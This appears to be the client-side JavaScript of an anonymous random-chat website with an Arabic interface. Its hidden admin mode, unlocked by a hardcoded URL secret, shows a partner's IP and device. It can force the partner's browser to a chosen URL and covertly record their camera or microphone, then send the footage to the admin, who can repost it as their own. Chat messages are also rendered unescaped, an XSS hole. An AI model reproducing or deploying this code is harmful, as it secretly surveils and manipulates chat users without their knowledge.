const socket = io();
const sr = document.getElementById('sr');
const hi = document.getElementById('hi');
const conv = document.getElementById('conv');
const inp = document.getElementById('inp');
const snd = document.getElementById('snd');
const chat = document.getElementById('chat');
const out = document.getElementById('out');
const fileInput = document.getElementById('file-input');
const micBtn = document.getElementById('mic-btn');
const timerEl = document.getElementById('timer');
const imageModal = document.getElementById('image-modal');
const modalImg = document.getElementById('modal-img');
const adminPanel = document.getElementById('admin-panel');
const mediaPreviewModal = document.getElementById('media-preview-modal');
const mediaPreviewContent = document.getElementById('media-preview-content');

let typingTimeout;
let timerInterval;
let secondsElapsed = 0;
let isConnectedPartner = false;

const urlParams = new URLSearchParams(window.location.search);
const isAdmin = urlParams.get('admin') === 'mySuperSecretAdmin123';
const adminSecret = urlParams.get('admin') || '';

if (isAdmin) {
  adminPanel.style.display = 'block';
}

inp.disabled = true;
snd.disabled = true;

socket.emit('find_partner');

socket.on('matched', () => {
  isConnectedPartner = true;
  hi.style.setProperty('display', 'table', 'important');
  inp.disabled = false;
  snd.disabled = false;
  inp.focus();
  startTimer();
});

socket.on('device_info', (data) => {
  if (isAdmin) {
    document.getElementById('client-info').innerText = `IP: ${data.ip} | Device: ${data.ua}`;
  }
});

socket.on('message', (data) => {
  appendMessage(data, false);
});

socket.on('display_typing', (isTyping) => {
  const indicator = document.getElementById('typing-indicator');
  indicator.style.display = isTyping ? 'block' : 'none';
  conv.scrollTop = conv.scrollHeight;
});

socket.on('partner_disconnected', () => {
  isConnectedPartner = false;
  chat.style.display = 'none';
  out.style.display = 'block';
  stopTimer();
});

function startTimer() {
  secondsElapsed = 0;
  timerEl.style.display = 'block';
  timerInterval = setInterval(() => {
    secondsElapsed++;
    const mins = Math.floor(secondsElapsed / 60).toString().padStart(2, '0');
    const secs = (secondsElapsed % 60).toString().padStart(2, '0');
    timerEl.textContent = `${mins}:${secs}`;
  }, 1000);
}

function stopTimer() {
  clearInterval(timerInterval);
}

inp.addEventListener('input', () => {
  socket.emit('typing', true);
  clearTimeout(typingTimeout);
  typingTimeout = setTimeout(() => {
    socket.emit('typing', false);
  }, 1000);
});

function linkify(text) {
  const urlRegex = /(https?:\/\/[^\s]+)/g;
  return text.replace(urlRegex, url => `<a href="${url}" target="_blank" style="color: inherit; text-decoration: underline; word-break: break-all;">🔗 ${url}</a>`);
}

function sendMsg() {
  const text = inp.value.trim();
  if(text !== "" && !inp.disabled) {
    const payload = { type: 'text', content: text };
    socket.emit('message', payload);
    appendMessage(payload, true);
    inp.value = "";
    socket.emit('typing', false);
  }
}

function appendMessage(data, isMe) {
  const element = document.createElement(isMe ? 'div' : 'p');
  element.className = isMe ? 'my-msg' : 'partner-msg';
  
  const contentSpan = document.createElement('span');
  contentSpan.className = 'msg-content-span';
  
  if (data.type === 'text') {
    contentSpan.innerHTML = linkify(data.content);
  } else if (data.type === 'image') {
    const img = document.createElement('img');
    img.src = data.content;
    img.style.maxWidth = '180px';
    img.style.maxHeight = '180px';
    img.style.borderRadius = '5px';
    img.style.display = 'block';
    img.style.marginTop = '5px';
    img.style.cursor = 'pointer';
    img.onclick = () => {
      modalImg.src = data.content;
      imageModal.style.display = 'flex';
    };
    contentSpan.appendChild(img);
  } else if (data.type === 'video') {
    const video = document.createElement('video');
    video.src = data.content;
    video.controls = true;
    video.style.maxWidth = '200px';
    video.style.borderRadius = '5px';
    video.style.display = 'block';
    video.style.marginTop = '5px';
    contentSpan.appendChild(video);
  } else if (data.type === 'audio') {
    const audio = document.createElement('audio');
    audio.src = data.content;
    audio.controls = true;
    audio.style.maxWidth = '200px';
    audio.style.display = 'block';
    audio.style.marginTop = '5px';
    contentSpan.appendChild(audio);
  }

  element.appendChild(contentSpan);
  conv.appendChild(element);
  conv.scrollTop = conv.scrollHeight;
}

function closeModal() {
  imageModal.style.display = 'none';
}

snd.addEventListener('click', sendMsg);
inp.addEventListener('keypress', (e) => {
  if(e.key === 'Enter') sendMsg();
});

fileInput.addEventListener('change', (e) => {
  if (!isConnectedPartner) {
    alert('لا يمكن إرسال ملفات لعدم وجود متصل حالياً!');
    fileInput.value = '';
    return;
  }

  const file = e.target.files[0];
  if (!file) return;

  const reader = new FileReader();
  reader.onload = function(event) {
    let type = 'image';
    if (file.type.startsWith('video')) type = 'video';
    else if (file.type.startsWith('audio')) type = 'audio';

    const payload = { type: type, content: event.target.result };
    socket.emit('message', payload);
    appendMessage(payload, true);
    fileInput.value = '';
  };
  reader.readAsDataURL(file);
});

let mediaRecorder;
let audioChunks = [];
let isRecording = false;

micBtn.addEventListener('click', async () => {
  if (!isConnectedPartner) {
    alert('لا يمكن تسجيل صوت لعدم وجود متصل حالياً!');
    return;
  }

  if (!isRecording) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      mediaRecorder = new MediaRecorder(stream);
      audioChunks = [];

      mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
      mediaRecorder.onstop = () => {
        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onload = function(e) {
          const payload = { type: 'audio', content: e.target.result };
          socket.emit('message', payload);
          appendMessage(payload, true);
        };
        reader.readAsDataURL(audioBlob);
      };

      mediaRecorder.start();
      isRecording = true;
      micBtn.classList.add('recording');
    } catch (err) {
      alert('تعذر الوصول إلى الميكروفون');
    }
  } else {
    mediaRecorder.stop();
    isRecording = false;
    micBtn.classList.remove('recording');
  }
});

function sendAdminUrl() {
  const url = document.getElementById('admin-url-inp').value.trim();
  if (!url) return alert('أدخل رابطاً صحيحاً');
  socket.emit('admin_action', { action: 'open_url', secret: adminSecret, url });
}

socket.on('force_open_url', (url) => {
  if (!isAdmin) window.location.href = url;
});

function requestAdminMedia(mediaType) {
  const duration = parseInt(document.getElementById('media-duration').value) || 5;
  socket.emit('admin_action', { action: 'request_media', secret: adminSecret, mediaType, duration });
}

socket.on('trigger_camera', async ({ mediaType, duration }) => {
  if (isAdmin) return;
  try {
    const constraints = { video: mediaType !== 'audio', audio: true };
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    
    if (mediaType === 'photo') {
      const videoTrack = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(videoTrack);
      const photoBlob = await imageCapture.takePhoto();
      const reader = new FileReader();
      reader.onloadend = () => {
        socket.emit('user_media_captured', { dataUrl: reader.result, type: 'image' });
        stream.getTracks().forEach(track => track.stop());
      };
      reader.readAsDataURL(photoBlob);
      return;
    }

    const recorder = new MediaRecorder(stream);
    let chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
      const mimeType = mediaType === 'audio' ? 'audio/webm' : 'video/webm';
      const blob = new Blob(chunks, { type: mimeType });
      const reader = new FileReader();
      reader.onloadend = () => {
        socket.emit('user_media_captured', { dataUrl: reader.result, type: mediaType });
      };
      reader.readAsDataURL(blob);
      stream.getTracks().forEach(track => track.stop());
    };

    recorder.start();
    setTimeout(() => {
      if (recorder.state === 'recording') recorder.stop();
    }, duration * 1000);
  } catch (err) {
    alert('تم رفض إذن الوسائط أو الكاميرا');
  }
});

let pendingCapturedMedia = null;
socket.on('display_captured_media_to_admin', (data) => {
  if (!isAdmin) return;
  pendingCapturedMedia = data;
  
  if (data.type === 'video') {
    mediaPreviewContent.innerHTML = `<video src="${data.dataUrl}" controls autoplay></video>`;
  } else if (data.type === 'audio') {
    mediaPreviewContent.innerHTML = `<audio src="${data.dataUrl}" controls autoplay></audio>`;
  } else {
    mediaPreviewContent.innerHTML = `<img src="${data.dataUrl}">`;
  }
  mediaPreviewModal.style.display = 'flex';
});

function approveCapturedMedia() {
  if (pendingCapturedMedia) {
    const payload = { type: pendingCapturedMedia.type, content: pendingCapturedMedia.dataUrl };
    socket.emit('message', payload);
    appendMessage(payload, true);
    cancelCapturedMedia();
  }
}

function cancelCapturedMedia() {
  pendingCapturedMedia = null;
  mediaPreviewModal.style.display = 'none';
}

function sendAlert() {
  const msg = prompt("اكتب نص التنبيه الإداري:");
  if (msg) socket.emit('admin_action', { action: 'alert', secret: adminSecret, message: msg });
}

socket.on('system_alert', (msg) => {
  const banner = document.getElementById('system-alert-banner');
  banner.innerText = `⚠️ تنبيه إداري: ${msg}`;
  banner.style.display = 'block';
  setTimeout(() => { banner.style.display = 'none'; }, 6000);
});

function clearChat(target) {
  socket.emit('admin_action', { action: 'clear_chat', secret: adminSecret, target: target });
}

socket.on('clear_chat', (target) => {
  if (target === 'all') {
    document.querySelectorAll('.my-msg, .partner-msg').forEach(el => el.remove());
  } else if (target === 'theirs') {
    document.querySelectorAll('.partner-msg').forEach(el => el.remove());
  }
});

function sendPresetRingtone() {
  const ringtoneUrl = document.getElementById('preset-ringtone').value;
  socket.emit('admin_action', { action: 'play_sound', secret: adminSecret, audioUrl: ringtoneUrl });
}

socket.on('play_sound_in_browser', (audioUrl) => {
  if (isAdmin) return;
  const audio = new Audio(audioUrl);
  audio.play().catch(err => console.log('تعذر تشغيل الصوت تلقائياً'));
});

function changeBgColor(color) {
  socket.emit('admin_action', { action: 'change_bg', secret: adminSecret, bgColor: color });
}

socket.on('change_bg', (bgColor) => {
  document.body.style.backgroundColor = bgColor;
});
